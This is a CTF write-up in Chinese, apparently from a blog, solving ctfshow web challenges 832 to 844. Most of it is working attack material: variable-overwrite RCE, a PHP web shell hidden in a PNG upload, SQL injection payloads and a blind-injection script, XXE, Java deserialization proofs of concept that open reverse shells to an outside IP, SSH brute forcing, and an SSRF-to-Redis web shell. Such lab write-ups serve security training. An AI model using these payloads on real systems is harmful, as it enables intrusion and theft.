+++
title= "Ctfshow 税务比武"
slug= "ctfshow-tax-competition-wu"
description= ""
date= "2025-12-31T20:23:10+08:00"
lastmod= "2025-12-31T20:23:10+08:00"
image= ""
license= ""
categories= ["复现"]
tags= [""]

+++

某省税务比赛题目，

## web832

网络安全为人民

```plain
对过暗号，是自己人
朋友，欢迎你来到网安的世界
在这里你会见到不一样的风景
在这里你会遇到很多有趣而有爱的人
收下这个来自同行者的礼物
ctfshow{518e7701-8d8c-4598-bf3f-7601f0fdb69b}
愿你比赛愉快
```

## web833

恢复源码

```php
// admin$ file check.php.bak
// check.php.bak: PHP script text, ASCII text
// admin$ cp check.php.bak check.php
<?php

error_reporting(0);

function getFilter($index=0){
    $filter=["strip_tags","addslashes"];
    return $index?$filter[1]:$filter[0];
}

function getHandle(){
    $filter=getFilter();
    $say=function($array) use (&$filter){
        extract($array);
        $hello=$filter($name);
        return $hello;
    };
    return $say;
}

$msg=getHandle();
$message="hello ".$msg($_REQUEST);




?>
```

`use (&$filter)`闭包通过引用的方式继承了外部的`$filter`变量，利用变量覆盖直接调用函数 RCE

```php
/check.php?filter=system&name=ls
/check.php?filter=system&name=tac /fl*
```

## web834

注册登录之后没看到有什么 cookie，修改密码之后终于获得了JWT cookie，secret 盲猜是 111111

```php
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJjdGZzaG93IiwibmFtZSI6InRlc3QifQ.-kj-qrzFxD2p717HfS_7GIPF7Wux4-qFiZpsJZyXRhQ
```

![img](1.png)

抓两个包，一鼓作气才能成功

```http
POST /user/reset HTTP/1.1
Host: fb1d236f-2279-4892-b335-9e3de23ed2e0.challenge.ctf.show
Cookie: username=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJjdGZzaG93IiwibmFtZSI6ImFkbWluIn0.FcrF-obaYbX5IeT8CzUwU0EmSw_y1BOfzoX2QaN--4o; JSESSIONID=DB07CFF5804493E2D3478A0BF1F4ACC7
Content-Length: 31
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Origin: https://fb1d236f-2279-4892-b335-9e3de23ed2e0.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://fb1d236f-2279-4892-b335-9e3de23ed2e0.challenge.ctf.show/user/reset
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Priority: u=0, i
Connection: keep-alive

username=test1&password=test123
```

然后再修改密码

```http
POST /user/changePass HTTP/1.1
Host: fb1d236f-2279-4892-b335-9e3de23ed2e0.challenge.ctf.show
Cookie: username=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJjdGZzaG93IiwibmFtZSI6ImFkbWluIn0.FcrF-obaYbX5IeT8CzUwU0EmSw_y1BOfzoX2QaN--4o; JSESSIONID=DB07CFF5804493E2D3478A0BF1F4ACC7
Content-Length: 16
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Origin: https://fb1d236f-2279-4892-b335-9e3de23ed2e0.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://fb1d236f-2279-4892-b335-9e3de23ed2e0.challenge.ctf.show/user/reset
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Priority: u=0, i
Connection: keep-alive

password=test123
```

再登陆即可

```http
欢迎你，admin
这个不需要任何技术的漏洞，
出自国内某知名软件厂商。
每次看到这些东西，我都会想——
网络世界怎么了？
网络世界还会好么？
网络真的有安全么？

我不知道你是否也会迷茫。
但请不要绝望。
因为当我们扛起这面旗帜的那一刻，
除了坚守和胜利，
我们便再没有别的选择。
ctfshow{9887412f-22db-4ee0-8eee-c0bfda323d4a}
```

## web835

admin\123456

```plain
欢迎你 admin

听说这个网站的管理员喜欢把核心源码备份一份，而且有强迫症的他必然会使用hbsw？.zip这个他喜欢的名字。

?为数字。
```

`hbsw7.zip`下载源码审计一下，发现就一个PHP文件

```php
<?php

error_reporting(0);
$action=$_GET['action'];

switch ($action) {
    case "upload":
        doUpload();
        break;
    case "include":
        doInclude();
    default:
        "nothing here";

}


function doInclude(){
    $file=$_POST['filename'];
    if(preg_match("/log|php|tmp/i",$file)){
        die("error filenname");
    }
    if(file_exists($file)){
        include "file://".$file;
    }
}

function doUpload(){
    if($_FILES["file"]["error"]>0){
        $ret = ["code"=>1,"msg"=>"文件上传失败"];
        die(json_encode($ret));
    }


    $file = $_FILES['file']['name'];
    $tmp_name=$_FILES['file']['tmp_name'];
    $content=file_get_contents($tmp_name);

    if(filter_filename($file)){
        $ret = ["code"=>2,"msg"=>"文件上传失败"];
        die(json_encode($ret));
    }

    if(filter_content($content)){
        $ret = ["code"=>3,"msg"=>"文件上传失败"];
        die(json_encode($ret));
    }

    move_uploaded_file($tmp_name,"./upload/".$file);
    $ret = ["code"=>0,"msg"=>"文件上传成功,文件路径为  /var/www/html/upload/".$file];
    die(json_encode($ret));
    
}

function filter_filename($file){
    $ban_ext=array("jpeg","png");
    $file_ext = end(explode(".",$file));
    return !in_array($file_ext,$ban_ext);
}

function filter_content($content){
    return preg_match("/php|include|require|get|post|request/i",$content);
}
```

可以文件上传，这里的waf也基本等于没有

```http
POST /api.php?action=upload HTTP/1.1
Host: aa32bbba-5889-49ce-a33e-15703bce13b2.challenge.ctf.show
Cookie: PHPSESSID=e75oqjbf3pe659gtr271342qdj
Content-Length: 205
Sec-Ch-Ua-Platform: "macOS"
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvRFzjsQgqydZtqJC
Sec-Ch-Ua-Mobile: ?0
Origin: https://aa32bbba-5889-49ce-a33e-15703bce13b2.challenge.ctf.show
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://aa32bbba-5889-49ce-a33e-15703bce13b2.challenge.ctf.show/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Priority: u=1, i
Connection: keep-alive

------WebKitFormBoundaryvRFzjsQgqydZtqJC
Content-Disposition: form-data; name="file"; filename="pwn.png"
Content-Type: image/png

<?=system($_COOKIE[1]);?>
------WebKitFormBoundaryvRFzjsQgqydZtqJC--
```

再包含图片即可

```http
POST /api.php?action=include HTTP/1.1
Host: aa32bbba-5889-49ce-a33e-15703bce13b2.challenge.ctf.show
Cookie: PHPSESSID=e75oqjbf3pe659gtr271342qdj;1=tac FLAG_IS_HERE.php;
Content-Length: 47
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Origin: https://aa32bbba-5889-49ce-a33e-15703bce13b2.challenge.ctf.show
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: https://aa32bbba-5889-49ce-a33e-15703bce13b2.challenge.ctf.show/api.php?action=include
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Sec-Fetch-User: ?1
Priority: u=0, i
Connection: keep-alive

filename=%2Fvar%2Fwww%2Fhtml%2Fupload%2Fpwn.png
```

回显

```http
YOUWIN;
ctfshow{e0a36685-5e6b-4c51-8e98-0cbe5c64315d}
拿好你的旗帜，然后我们去看看下一个。
相信我，这只是个开始，
弱口令、文件上传、多么古老的问题。
那么这个发生在我们身边故事已足够震撼
也许，一线大厂和我们有些距离
$success=<<<YOUWIN
```

## web836

二次注入，这里我们选择报错注入来获得回显

```sql
111' and extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema=database()));#
```

![img](2.png)

再修改密码即可得到回显

![img](3.png)

以此类推，进行注入

```sql
111' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='app_flag'),0x7e));#

111' and extractvalue(1,concat(0x7e,(select flag from app_flag),0x7e));#

ctfshow{02f5decd-ff03-469a-bf6c

111' and extractvalue(1,concat(0x7e,(select right(flag,20) from app_flag),0x7e));#
'~a-bf6c-c7d7d0f981b8}~'


ctfshow{02f5decd-ff03-469a-bf6c-c7d7d0f981b8}
```

## web837

下载配置文件

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configs>
    <config name="shutdown">
        <path>/usr/local/bin</path>
        <execute>shutdown.sh</execute>
        <args>-clear</args>
    </config>
</configs>
```

并且可以上传配置文件，直接打XXE攻击就行了

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<configs>
    <config name="shutdown">
        <path>/usr/local/bin</path>
        <execute>shutdown.sh</execute>
        <args>&xxe;</args>
    </config>
</configs>
```

![img](4.png)



## web838

发现任意文件读取

```plain
税务系统长久以来主要使用的系统构建语言就是java，在多次通报的*友软件漏洞中，均提及了其原生反序列化漏洞。
```

读取配置文件`../WEB-INF/web.xml`

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>Archetype Created Web Application</display-name>
    <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>/WEB-INF/applicationContext.xml</param-value>
    </context-param>
    <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
    </listener>
    <filter>
        <filter-name>charset</filter-name>
        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
        <init-param>
            <param-name>encoding</param-name>
            <param-value>utf-8</param-value>
        </init-param>
    </filter>

    <filter-mapping>
        <filter-name>charset</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
    <servlet>
        <servlet-name>dispatcher</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
            <param-name>contextConfigLocation</param-name>
            <param-value>/WEB-INF/dispatcher-servlet.xml</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
        <servlet-name>dispatcher</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>

</web-app>
```

读取 servlet 配置文件`../WEB-INF/dispatcher-servlet.xml`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:mvc="http://www.springframework.org/schema/mvc"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">

    <context:annotation-config />

    <mvc:annotation-driven/>


    <mvc:resources mapping="/layui/**" location="/WEB-INF/static/layui/" />
    <mvc:resources mapping="/images/**" location="/WEB-INF/static/images/" />
    <mvc:resources mapping="/css/**" location="/WEB-INF/static/css/" />

    <mvc:default-servlet-handler />


    <bean id="defaultViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver">
        <property name="viewClass" value="org.springframework.web.servlet.view.JstlView"/>
        <property name="prefix" value="/WEB-INF/views/"/>
        <property name="suffix" value=".jsp"/>
        <property name="exposeContextBeansAsAttributes" value="true"/>
    </bean>

    <!-- IndexController-->
    <context:component-scan base-package="com.ctfshow.controller"/>
</beans>
```

读取控制器`../WEB-INF/classes/com/ctfshow/controller/IndexController.class`

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ctfshow.controller;

import com.ctfshow.entity.User;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.Base64;
import javax.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@RequestMapping({"/"})
public class IndexController {
    @RequestMapping(
        value = {"/"},
        method = {RequestMethod.GET}
    )
    public String index() {
        return "index";
    }

    @RequestMapping(
        value = {"/"},
        method = {RequestMethod.POST}
    )
    @ResponseBody
    public String index(HttpServletRequest request) {
        User user = null;

        try {
            byte[] userData = Base64.getDecoder().decode(request.getParameter("userData"));
            ObjectInputStream safeObjectInputStream = new ObjectInputStream(new ByteArrayInputStream(userData));
            user = (User)safeObjectInputStream.readUnshared();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            return "User class can not unserialize";
        } catch (Exception e) {
            e.printStackTrace();
            return "unserialize error";
        }

        return "unserialize done, you username is " + user.getUsername();
    }
}
```

给了反序列化接口，读取User类看看`../WEB-INF/classes/com/ctfshow/entity/User.class`

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ctfshow.entity;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;
import java.util.Objects;

public class User implements Serializable {
    private static final long serialVersionUID = 1L;
    private int id;
    private String username;
    private String password;
    private String email;
    private String address;

    public int getId() {
        return this.id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public String getUsername() {
        return this.username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return this.password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public boolean equals(Object o) {
        if (this == o) {
            return true;
        } else if (o != null && this.getClass() == o.getClass()) {
            User user = (User)o;
            return Objects.equals(this.username, user.username) && Objects.equals(this.password, user.password);
        } else {
            return false;
        }
    }

    public int hashCode() {
        return Objects.hash(new Object[]{this.id, this.username, this.password});
    }

    public String getEmail() {
        return this.email;
    }

    public void setEmail(String email) {
        this.email = email;
    }

    public boolean isNull() {
        if (null != this.username && !this.username.isEmpty()) {
            return null == this.password || this.password.isEmpty();
        } else {
            return true;
        }
    }

    private void readObject(ObjectInputStream input) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        input.defaultReadObject();
        Class.forName(this.username).getMethod(this.email, String.class).invoke(Class.forName(this.username).getMethod(this.password).invoke(Class.forName(this.username)), this.address);
    }
}
```

`User#readObject`直接进行了反射，还需要在User类里面加一个setAddress方法

```java
    public void setAddress(String address) {
        this.address = address;
    }
```

写出 poc，

```java
package com.ctfshow.entity;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class web858 {
    public static void main(String args[]) throws Exception{
        User user = new User();
        user.setUsername("java.lang.Runtime");
        user.setPassword("getRuntime");
        user.setEmail("exec");
        user.setAddress("nc 154.36.181.12 12345 -e /bin/sh");

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(user);
        oos.close();

        String base64Str = Base64.getEncoder().encodeToString(barr.toByteArray());
        System.out.println(base64Str);
    }
}
```

## web839

反编译APK文件

```java
package com.ctfshow.ctferpro.data;

import com.ctfshow.ctferpro.data.Result;
import com.ctfshow.ctferpro.data.model.LoggedInUser;
import com.ctfshow.ctferpro.util.CryptoJS;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.UUID;

/* loaded from: classes5.dex */
public class LoginDataSource {
    private String authURL = "http://www.xxxx.com/app/auth";

    public Result<LoggedInUser> login(String username, String password) {
        try {
            String uuid = UUID.randomUUID().toString();
            Runtime.getRuntime().exec("curl -d 'username=" + new String(Base64.getEncoder().encode(CryptoJS.encode(username, uuid).getBytes(StandardCharsets.UTF_8))) + "' -d 'password=" + password + "' -b 'uuid=" + uuid + "' -H 'User-Agent: ctfer_pro_app' " + this.authURL);
            LoggedInUser fakeUser = new LoggedInUser(uuid, "用户 " + uuid + " 激活失败");
            return new Result.Success(fakeUser);
        } catch (Exception e) {
            return new Result.Error(new IOException("Error logging in, authURL 应替换为题目URL地址", e));
        }
    }

    public void logout() {
    }
}
```

看到这里可以进行参数注入，需要POST传参

```java
package com.ctfshow.ctferpro.util;

/* loaded from: classes7.dex */
public class CryptoJS {
    public static String encode(String aInput, String key) {
        int[] iS = new int[256];
        byte[] iK = new byte[256];
        for (int i = 0; i < 256; i++) {
            iS[i] = i;
        }
        for (short i2 = 0; i2 < 256; i2 = (short) (i2 + 1)) {
            iK[i2] = (byte) key.charAt(i2 % key.length());
        }
        int j = 0;
        for (int i3 = 0; i3 < 255; i3++) {
            j = ((iS[i3] + j) + iK[i3]) % 256;
            int temp = iS[i3];
            iS[i3] = iS[j];
            iS[j] = temp;
        }
        int i4 = 0;
        int j2 = 0;
        char[] iInputChar = aInput.toCharArray();
        char[] iOutputChar = new char[iInputChar.length];
        short x = 0;
        while (x < iInputChar.length) {
            i4 = (i4 + 1) % 256;
            j2 = (iS[i4] + j2) % 256;
            int temp2 = iS[i4];
            iS[i4] = iS[j2];
            iS[j2] = temp2;
            int t = (iS[i4] + (iS[j2] % 256)) % 256;
            int iY = iS[t];
            char iCY = (char) iY;
            iOutputChar[x] = (char) (iInputChar[x] ^ iCY);
            int temp3 = x + 1;
            x = (short) temp3;
        }
        return new String(iOutputChar);
    }
}
```

逆向加解密算法才行，简单的魔改rc4算法，发现，加密和解密是同一个方法，相当于我们已经控制任意参数加密，下一步不明白怎么做了，注入的地方给了一部分 header，测试 sql 注入成功，写出脚本

```java
import httpx
import base64
import time
import string

def rc4_custom(data, key):
    S = list(range(256))
    j = 0
    for i in range(255): 
        j = (S[i] + j + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    i = j = 0
    out = []
    for char in data:
        i = (i + 1) % 256
        j = (S[i] + j) % 256
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % 256
        out.append(ord(char) ^ S[t])
    return out

def java_utf8_encode(int_list):
    s = "".join([chr(c) for c in int_list])
    return s.encode('utf-8')

def encrypt_payload(plain_text, key):
    rc4_ints = rc4_custom(plain_text, key)
    utf8_bytes = java_utf8_encode(rc4_ints)
    return base64.b64encode(utf8_bytes).decode('utf-8')

target_url = "https://5066e861-f1f9-4628-904f-c156ff0eb83d.challenge.ctf.show/app/auth" 
STATIC_UUID = "123456"

alphabet = string.ascii_letters + string.digits + string.punctuation

def check_boolean(sql_condition):
    payload_fmt = "1' union select 1, if(({}), 1, 0);#"
    payload = payload_fmt.format(sql_condition)
    
    encrypted_username = encrypt_payload(payload, STATIC_UUID)
    
    data = {"username": encrypted_username, "password": "1"}
    cookies = {"uuid": STATIC_UUID}
    headers = {"User-Agent": "ctfer_pro_app"}

    try:
        res = httpx.post(target_url, data=data, cookies=cookies, headers=headers, verify=False, timeout=10)
        return "success" in res.text
    except Exception as e:
        return False

def run():
    print(f"[*] Target: {target_url}")
    table_name = ""
    for i in range(1, 50):
        found = False
        for char in alphabet:
            # sql = f"ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{i},1))={ord(char)}"
            # sql = f"ascii(substr((select column_name from information_schema.columns where table_name='app_f1ag' limit 0,1),{i},1))={ord(char)}"

            sql = f"ascii(substr((select f1ag from app_f1ag limit 0,1),{i},1))={ord(char)}"


            print(f"\rCurrent Table: {table_name}{char}", end="")
            
            if check_boolean(sql):
                table_name += char
                found = True
                break
        
        if not found:
            print("\n[!] 字符未匹配或表名结束。")
            break
            
    print(f"\n\n[+] Found Table Name: {table_name}")
    
    if table_name:
        print(f"[*] 下一步建议: 修改脚本查询表 `{table_name}` 中的字段。")
    else:
        print("[-] 未能跑出表名，可能是 information_schema 被过滤，或者无法访问。")

if __name__ == "__main__":
    run()
```

## web841

给了一个字典，考察 ssh 爆破

```bash
brew install hydra

hydra -l user -P pass.dic -s 28117 -t 4 ssh://pwn.challenge.ctf.show
ssh user@pwn.challenge.ctf.show -p28117
```

## web842

```bash
python3 -m pip install -i https://pypi.org/simple/ GitHacker


githacker --help
githacker --url https://f8452be2-82a5-4157-9853-9e3ff5fe8ac2.challenge.ctf.show/.git/ --output-folder result
```

结果失败了，好像是因为它并不是一个 git 仓库

```bash
git clone https://github.com/lijiejie/GitHack.git
cd GitHack
python2 GitHack.py https://f8452be2-82a5-4157-9853-9e3ff5fe8ac2.challenge.ctf.show/.git/
```

得到了源码

```php
<?php

error_reporting(0);

if(isset($_POST['code'])){
	$code = $_POST['code'];
	system("echo $code|base64");
}
//code=1;cat /flag;echo 1
```

## web843

30M的源码，Emm，可以的，看了下依赖，就是一个Spring，啥也没有

```java
package com.ctfshow.filter;

import com.ctfshow.entity.User;
import com.ctfshow.util.CookieUtil;
import com.mysql.jdbc.NonRegisteringDriver;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URLDecoder;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.core.annotation.Order;
import org.springframework.jdbc.datasource.init.ScriptUtils;
import org.springframework.transaction.interceptor.RuleBasedTransactionAttribute;

/* JADX WARN: Classes with same name are omitted:
  CookieFilter.class
 */
@WebFilter(filterName = "CookieFilter", urlPatterns = {ScriptUtils.DEFAULT_BLOCK_COMMENT_START_DELIMITER})
@Order(Integer.MAX_VALUE)
/* loaded from: source.zip:WEB-INF/classes/com/ctfshow/filter/CookieFilter.class */
public class CookieFilter implements Filter {
    @Override // javax.servlet.Filter
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override // javax.servlet.Filter
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws ServletException, IOException {
        String token = CookieUtil.getCookieValue((HttpServletRequest) servletRequest, "token", true);
        if (null != token && token != "") {
            byte[] base = Base64.getDecoder().decode(URLDecoder.decode(token, "UTF-8").replace(" ", RuleBasedTransactionAttribute.PREFIX_COMMIT_RULE).getBytes(StandardCharsets.UTF_8));
            ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(base));
            try {
                User user = (User) objectInputStream.readObject();
                if (null != user && user.getUsername().equals("admin")) {
                    servletRequest.setAttribute(NonRegisteringDriver.USER_PROPERTY_KEY, user);
                }
            } catch (ClassNotFoundException e) {
                throw new RuntimeException(e);
            }
        } else {
            User user2 = new User("guest");
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(user2);
            String cookieToken = new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));
            CookieUtil.setCookie((HttpServletRequest) servletRequest, (HttpServletResponse) servletResponse, "token", URLEncoder.encode(cookieToken, "UTF-8"));
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override // javax.servlet.Filter
    public void destroy() {
    }
}
```

这里会进行反序列化，config 类里面有直接可以利用的`ProcessBuilder().start()`

```java
package com.ctfshow.entity;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.lang.reflect.InvocationTargetException;

/* JADX WARN: Classes with same name are omitted:
  Config.class
 */
/* loaded from: source.zip:WEB-INF/classes/com/ctfshow/entity/Config.class */
public class Config implements Serializable {
    private static final long serialVersionUID = 1;
    private String name = "";
    private String path = "";
    private String execute;
    private String[] args;

    public String getName() {
        return this.name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getPath() {
        return this.path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getExecute() {
        return this.execute;
    }

    public void setExecute(String execute) {
        this.execute = execute;
    }

    public String[] getArgs() {
        return this.args;
    }

    public void setArgs(String[] args) {
        this.args = args;
    }

    private void readObject(ObjectInputStream input) throws IllegalAccessException, NoSuchMethodException, ClassNotFoundException, IOException, InvocationTargetException {
        input.defaultReadObject();
        new ProcessBuilder(this.args).start();
    }
}
```

写出poc

```java
package com.ctfshow.entity;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.net.URLEncoder;

public class web843 {
    public static void main(String[] args) throws Exception {
        Config config = new Config();

        String ip = "154.36.181.12";
        String port = "12345";
        String cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f";

        config.setArgs(new String[]{"/bin/sh", "-c", cmd});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(config);
        oos.close();

        String base64Str = Base64.getEncoder().encodeToString(barr.toByteArray());
        String urlEncoded = URLEncoder.encode(base64Str, "UTF-8");
        System.out.println(urlEncoded);
    }
}
```

## web844

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ctfshow.controller;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Map;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.servlet.ModelAndView;

@Controller
@RequestMapping({"/"})
public class IndexController {
    @RequestMapping(
        value = {"/"},
        method = {RequestMethod.GET},
        produces = {"text/html;charset=utf-8"}
    )
    public ModelAndView index() {
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.setViewName("index");
        return modelAndView;
    }

    @RequestMapping(
        value = {"/goPage"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public String goPage(@RequestParam Map<String, String> param) {
        String result = "";
        String request = "";
        String url = (String)param.get("url");
        String port = (String)param.get("port");
        if (null != url && null != param && !param.isEmpty()) {
            try {
                Socket socket = new Socket(url, Integer.valueOf(port));
                OutputStream out = socket.getOutputStream();
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));

                for(Map.Entry<String, String> p : param.entrySet()) {
                    request = request + (String)p.getKey() + (String)p.getValue() + "\r\n";
                }

                out.write(request.getBytes());

                String line;
                while((line = in.readLine()) != null) {
                    result = result + line;
                }
            } catch (Exception e) {
                e.printStackTrace();
                result = "request error";
            }

            return result;
        } else {
            result = "url error";
            return result;
        }
    }
}
```

goPage 方法遍历所有参数并进行 tcp 连接，明显的 ssrf 漏洞，并且发现后端有 redis 服务

```java
/goPage?url=127.0.0.1&port=6379&config%20set%20dir%20%2fusr%2flocal%2ftomcat%2fwebapps%2fROOT%2f%0d%0aconfig%20set%20dbfilename%20d.jsp%0d%0aset%20x%20%22%5cn%5cn%3c%25%20Runtime.getRuntime().exec(request.getParameter(%5c%22cmd%5c%22))%3b%25%3e%5cn%5cn%22%0d%0asave%0d%0aquit=
```

一口气执行完，避免 java 连接时等待结果无反应导致超时

```java
/d.jsp?cmd=cp%20/flag%20/usr/local/tomcat/webapps/ROOT/flag.txt

/flag.txt
```

还是想着有回显的会方便点，多次调整，主要是需要设置`config set rdbcompression no`，不然 Redis 默认开启了 RDB 压缩，木马内容就乱了

```java
